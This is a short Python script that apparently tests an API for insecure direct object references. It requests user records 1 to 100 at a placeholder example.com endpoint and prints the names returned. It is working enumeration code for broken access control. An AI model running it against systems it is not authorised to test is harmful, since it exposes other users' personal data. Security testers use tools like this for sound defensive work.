import requests

url = "https://example.com/api/user/123"  

# Range of user IDs to test
start_id = 1
end_id = 100

headers = {
    "User-Agent": "IDOR-Tester/1.0",
    "Accept": "application/json"
}

for user_id in range(start_id, end_id + 1):
    test_url = url.replace("123", str(user_id))
    
    try:
        response = requests.get(test_url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            print(f"[+] Accessing user ID {user_id}...")

            try:
                data = response.json()  
                name = data.get("name", "N/A")
                print(f"    User name: {name}")
            except ValueError:
                print(f"    Response not in JSON format for user {user_id}")
        elif response.status_code == 403:
            print(f"[-] Access forbidden for user ID {user_id}")
        elif response.status_code == 404:
            print(f"[-] User ID {user_id} not found")
        else:
            print(f"[?] Unexpected status {response.status_code} for user ID {user_id}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for user ID {user_id}: {e}")
